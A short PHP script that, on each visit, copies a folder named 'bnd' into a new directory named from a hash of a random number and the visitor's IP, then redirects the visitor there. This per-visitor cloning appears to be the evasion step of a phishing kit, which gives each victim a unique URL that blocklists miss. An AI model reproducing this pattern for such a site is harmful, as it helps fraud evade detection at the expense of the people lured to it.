<?php

$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
$dst    = substr(md5($random), 0, 8);

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="bnd";
recurse_copy( $src, $dst );
header("location:".$dst."");
exit;

?>